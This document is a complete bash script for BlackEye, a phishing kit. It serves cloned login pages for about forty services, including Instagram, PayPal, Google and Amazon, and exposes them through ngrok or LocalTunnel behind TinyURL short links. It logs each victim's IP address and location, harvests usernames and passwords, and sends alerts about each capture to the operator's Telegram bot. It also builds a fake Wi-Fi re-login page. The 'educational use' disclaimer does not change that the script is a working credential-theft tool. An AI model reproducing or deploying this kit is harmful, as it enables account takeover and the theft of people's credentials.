#!/bin/bash

# ------------------------------------------------------------
# BlackEye v1.3 – Refactored for educational labs
# Phase 2: Telegram alerts, JSON structured logging, lab mode, session summary
# ------------------------------------------------------------
VERSION="1.3"

# ------------------------------------------------------------
# Configuration via environment variables (or .env file)
# ------------------------------------------------------------
if [[ -f ".env" ]]; then
    export $(grep -v '^#' .env | xargs)
fi
# Expected env vars:
#   TELEGRAM_BOT_TOKEN   – Bot token for alerts (optional)
#   TELEGRAM_CHAT_ID     – Chat ID to receive alerts (optional)
#   NGROK_AUTHTOKEN      – Ngrok auth token (optional, for paid accounts)
#   LAB_MODE             – Set to 1 to enable lab‑mode warning banner

# ------------------------------------------------------------
# Helper: coloured log output
# ------------------------------------------------------------
log_info()   { printf "\e[1;94m[+] %s\e[0m\n" "$*"; }
log_warn()   { printf "\e[1;93m[!] %s\e[0m\n" "$*"; }
log_success(){ printf "\e[1;92m[✓] %s\e[0m\n" "$*"; }

# ------------------------------------------------------------
# Dependency check – aborts if a required binary is missing
# ------------------------------------------------------------
check_deps() {
    local missing=0
    for dep in php node lt curl jq ngrok; do
        command -v $dep >/dev/null 2>&1 || { log_warn "Missing dependency: $dep"; missing=1; }
    done
    (( missing )) && { log_warn "Please install the missing dependencies and restart."; exit 1; }
    log_success "All required dependencies are present."
}

# ------------------------------------------------------------
# Banner – displays disclaimer and version information
# ------------------------------------------------------------
banner() {
    printf "\e[101m\e[1;77:: Disclaimer: Developers assume no liability and are not responsible for any misuse or damage caused by BlackEye. ::\e[0m\n"
    printf "\e[101m\e[1;77:: Only use for educational purposes!! (Version $VERSION) ::\e[0m\n"
    printf "\e[101m\e[1;77::     BLACKEYE By @shuvo-halder                             ::\e[0m\n"
    printf "\n"
}

# ------------------------------------------------------------
# Platform map – defines the numeric menu and associated folder
# ------------------------------------------------------------
declare -A PLATFORMS=(
    [1]=instagram     [2]=facebook      [3]=snapchat    [4]=twitter
    [5]=github        [6]=google        [7]=origin      [8]=yahoo
    [9]=linkedin      [10]=protonmail  [11]=wordpress  [12]=microsoft
    [13]=instafollowers [14]=pinterest [15]=apple      [16]=verizon
    [17]=dropbox      [18]=line        [19]=shopify    [20]=messenger
    [21]=gitlab       [22]=twitch      [23]=myspace    [24]=badoo
    [25]=vk          [26]=yandex      [27]=devianart  [28]=wifi
    [29]=paypal      [30]=steam       [31]=tiktok     [32]=playstation
    [33]=shopping    [34]=amazon      [35]=icloud     [36]=spotify
    [37]=netflix     [38]=reddit      [39]=stackoverflow [40]=create
    [41]=binance    # special – opens the project page
)

# ------------------------------------------------------------
# Parse command‑line arguments (lab mode)
# ------------------------------------------------------------
LAB_MODE=0
while [[ $# -gt 0 ]]; do
    case "$1" in
        --lab) LAB_MODE=1; shift;;
        *) shift;;
    esac
done

# ------------------------------------------------------------
# Menu – prints a compact, colour‑coded list of platforms
# ------------------------------------------------------------
menu() {
    printf "\nSelect a target platform (or 41 for project page):\n"
    for i in "${!PLATFORMS[@]}"; do
        printf "  \e[1;92m[%02d]\e[0m \e[1;91m%s\e[0m\n" "$i" "${PLATFORMS[$i]}"
    done
    printf "\nEnter choice: "
    read -r option
    if [[ -z "${PLATFORMS[$option]}" ]]; then
        log_warn "Invalid option!"
        menu
        return
    fi
    server="${PLATFORMS[$option]}"
    if [[ "$option" -eq 41 ]]; then
        open_page
        return
    fi
    start
}

# ------------------------------------------------------------
# Open project page (option 41)
# ------------------------------------------------------------
open_page() {
    local url="https://github.com/EricksonAtHome/bes"
    if command -v open >/dev/null 2>&1; then
        open "$url"
    else
        xdg-open "$url" >/dev/null 2>&1 || echo "Please open $url manually"
    fi
}

# ------------------------------------------------------------
# Prompt for tunnelling method – LocalTunnel (1) or ngrok (2)
# ------------------------------------------------------------
start() {
    printf "\nChoose tunnelling method:\n"
    printf "  1) LocalTunnel\n"
    printf "  2) ngrok\n"
    read -r method
    case "$method" in
        1) start_localtunnel;;
        2) start_ngrok;;
        *) log_warn "Unsupported method – defaulting to LocalTunnel"; start_localtunnel;;
    esac
}

# ------------------------------------------------------------
# Helper – send Telegram alert (if configured)
# ------------------------------------------------------------
send_telegram_alert() {
    local msg="$1"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" -d text="${msg}" >/dev/null
    fi
}

# ------------------------------------------------------------
# Helper – write JSON event to session log
# ------------------------------------------------------------
log_event() {
    local json="$1"
    echo "$json" >> "$LOG_FILE"
}

# ------------------------------------------------------------
# LocalTunnel launch – starts PHP server and prints URLs
# ------------------------------------------------------------
start_localtunnel() {
    [[ -e sites/$server/ip.txt ]] && rm -f sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -f sites/$server/usernames.txt
    log_info "Starting php server for $server..."
    ( cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 & )
    PHP_PID=$!
    sleep 2
    log_info "Launching LocalTunnel..."
    lt --port 5555 --subdomain "wmw-$server-com" >/dev/null 2>&1 &
    LT_PID=$!
    sleep 4
    local public="https://wmw-${server}-com.loca.lt"
    log_success "Public URL: $public"
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$public")
    log_success "Short URL: $short_link"
    checkfound
}

# ------------------------------------------------------------
# ngrok launch – starts PHP server, invokes ngrok, extracts public URL
# ------------------------------------------------------------
start_ngrok() {
    [[ -e sites/$server/ip.txt ]] && rm -f sites/$server/ip.txt
    [[ -e sites/$server/usernames.txt ]] && rm -f sites/$server/usernames.txt
    log_info "Starting php server for $server..."
    ( cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 & )
    PHP_PID=$!
    sleep 2
    if [[ -n "$NGROK_AUTHTOKEN" ]]; then
        ngrok authtoken "$NGROK_AUTHTOKEN" >/dev/null 2>&1 || log_warn "Failed to set ngrok authtoken"
    fi
    log_info "Launching ngrok..."
    ngrok http 5555 >/dev/null 2>&1 &
    NGROK_PID=$!
    sleep 5
    public=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$public" || "$public" == "null" ]]; then
        log_warn "Failed to obtain ngrok public URL"
        kill $NGROK_PID $PHP_PID 2>/dev/null
        return
    fi
    log_success "Public URL: $public"
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$public")
    log_success "Short URL: $short_link"
    checkfound
}

# ------------------------------------------------------------
# Wait for victim to open the link and capture IP
# ------------------------------------------------------------
checkfound() {
    log_info "Waiting for victim to open the link..."
    while true; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            log_success "IP file detected!"
            catch_ip
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Capture and display IP / Geo data – also log JSON + Telegram
# ------------------------------------------------------------
catch_ip() {
    mkdir -p "sites/$server/logs"
    SESSION_ID=$(date -u +%Y%m%dT%H%M%SZ)
    LOG_FILE="sites/$server/logs/${SESSION_ID}.json"
    touch "$LOG_FILE"
    ip=$(grep -a 'IP:' "sites/$server/ip.txt" | cut -d ' ' -f2 | tr -d '\r')
    ua=$(grep 'User-Agent:' "sites/$server/ip.txt" | cut -d '"' -f2)
    cn=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.country_name' 2>/dev/null || echo "N/A")
    re=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.region' 2>/dev/null || echo "N/A")
    ct=$(curl -s "https://ipapi.co/$ip/json" | jq -r '.city' 2>/dev/null || echo "N/A")
    log_success "IP: $ip | UA: $ua"
    log_success "Location: $cn / $re / $ct"
    timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    json=$(jq -n --arg ts "$timestamp" --arg ip "$ip" --arg ua "$ua" --arg cn "$cn" --arg re "$re" --arg ct "$ct" '{timestamp:$ts, type:"ip", ip:$ip, user_agent:$ua, country:$cn, region:$re, city:$ct}')
    log_event "$json"
    send_telegram_alert "🔎 New IP captured: $ip ($cn, $ct)"
    cat "sites/$server/ip.txt" >> "sites/$server/saved.ip.txt"
    getcredentials
}

# ------------------------------------------------------------
# Poll for captured credentials – log JSON + Telegram
# ------------------------------------------------------------
getcredentials() {
    log_info "Waiting for credentials..."
    while true; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            log_success "Credentials file found!"
            catch_cred
            break
        fi
        sleep 1
done
}

# ------------------------------------------------------------
# Display, store credentials, JSON log, Telegram alert
# ------------------------------------------------------------
catch_cred() {
    account=$(grep -o 'Account:.*' "sites/$server/usernames.txt" | cut -d ' ' -f2-)
    password=$(grep -o 'Pass:.*' "sites/$server/usernames.txt" | cut -d ':' -f2-)
    log_success "Account: $account"
    log_success "Password: $password"
    cat "sites/$server/usernames.txt" >> "sites/$server/saved.usernames.txt"
    timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    json=$(jq -n --arg ts "$timestamp" --arg acc "$account" --arg pwd "$password" '{timestamp:$ts, type:"credential", account:$acc, password:$pwd}')
    log_event "$json"
    send_telegram_alert "📋 Credential captured for $account"
    kill $PHP_PID $LT_PID $NGROK_PID 2>/dev/null
    killall -2 php >/dev/null 2>&1
    killall -2 node >/dev/null 2>&1
    killall -2 ngrok >/dev/null 2>&1
    summary_report
    exit 0
}

# ------------------------------------------------------------
# Summary report – printed on graceful exit
# ------------------------------------------------------------
summary_report() {
    if [[ -f "$LOG_FILE" ]]; then
        local ip_count=$(jq '[.type=="ip"] | length' "$LOG_FILE")
        local cred_count=$(jq '[.type=="credential"] | length' "$LOG_FILE")
        log_info "=== Session Summary ==="
        log_info "  IPs captured      : $ip_count"
        log_info "  Credentials found : $cred_count"
        log_info "  Log file          : $LOG_FILE"
    fi
}

# ------------------------------------------------------------
# Custom page builder – adds lab banner when LAB_MODE=1
# ------------------------------------------------------------
createpage() {
    local default_cap1="Wi-fi Session Expired"
    local default_cap2="Please login again."
    local default_user_text="Username:"
    local default_pass_text="Password:"
    local default_sub_text="Log-In"
    read -p $'\e[1;92m[*]\e[0m Title 1 (Default: Wi-fi Session Expired): ' cap1
    cap1=${cap1:-$default_cap1}
    read -p $'\e[1;92m[*]\e[0m Title 2 (Default: Please login again.): ' cap2
    cap2=${cap2:-$default_cap2}
    read -p $'\e[1;92m[*]\e[0m Username field (Default: Username:): ' user_text
    user_text=${user_text:-$default_user_text}
    read -p $'\e[1;92m[*]\e[0m Password field (Default: Password:): ' pass_text
    pass_text=${pass_text:-$default_pass_text}
    read -p $'\e[1;92m[*]\e[0m Submit field (Default: Log‑In): ' sub_text
    sub_text=${sub_text:-$default_sub_text}
    local lab_banner=""
    if [[ "$LAB_MODE" -eq 1 ]]; then
        lab_banner="<div style='color:red; font-weight:bold; text-align:center;'>[LAB MODE] This page is for educational testing only.</div>"
    fi
    cat <<EOF > sites/create/login.html
<!DOCTYPE html>
<html>
<body bgcolor="gray" text="white">
${lab_banner}
<center><h2>$cap1<br><br>$cap2</h2></center>
<center>
<form method="POST" action="login.php">
<label>$user_text</label><br>
<input type="text" name="username" size="64"><br>
<label>$pass_text</label><br>
<input type="password" name="password" size="64"><br><br>
<input type="submit" value="$sub_text">
</form>
</center>
</body>
</html>
EOF
}

# ------------------------------------------------------------
# Graceful termination – kills background services
# ------------------------------------------------------------
stop() {
    pkill -f -2 php >/dev/null 2>&1
    pkill -f -2 node >/dev/null 2>&1
    pkill -f -2 ngrok >/dev/null 2>&1
    pkill -f -2 lt >/dev/null 2>&1
    kill $PHP_PID $LT_PID $NGROK_PID 2>/dev/null
    summary_report
}

# ------------------------------------------------------------
# Main execution flow
# ------------------------------------------------------------
trap 'printf "\n"; stop; exit 1' INT TERM
check_deps
banner
menu

# End of file
